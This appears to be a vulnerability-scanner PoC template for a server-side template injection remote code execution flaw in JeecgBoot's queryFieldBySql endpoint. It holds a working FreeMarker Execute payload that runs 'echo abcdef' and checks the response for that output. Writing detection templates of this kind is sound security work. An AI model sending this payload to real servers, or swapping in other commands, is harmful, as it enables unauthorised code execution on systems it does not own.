{
        'name': 'JeecgBoot queryFieldBySql SSTI远程代码执行漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/jeecg-boot/jmreport/queryFieldBySql',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
                'Content-Type': 'application/json'
            },
            'data': """{"sql":"select '<#assign ex=\\"freemarker.template.utility.Execute\\"?new()> ${ ex(\\"echo abcdef\\") }' "}""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'abcdef'
        }}]
    }